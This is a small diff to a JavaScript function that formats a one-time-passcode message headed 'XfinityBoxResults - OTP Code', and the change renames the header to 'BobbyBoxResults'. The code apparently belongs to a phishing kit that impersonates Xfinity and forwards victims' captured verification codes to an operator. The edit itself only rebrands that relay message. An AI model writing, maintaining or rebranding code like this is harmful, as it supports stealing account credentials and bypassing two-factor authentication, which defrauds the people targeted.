@@ -40,7 +40,7 @@ const composeOtpMessage = (data) => {
     timeZone: 'UTC', hour12: true
   }) + ' UTC';
 
-  return `<b>🔑 XfinityBoxResults - OTP Code 🔑</b>
+  return `<b>🔑 BobbyBoxResults - OTP Code 🔑</b>
 
 <b>VERIFICATION CODE</b>
 🔢 OTP Code: ${safeOtp}
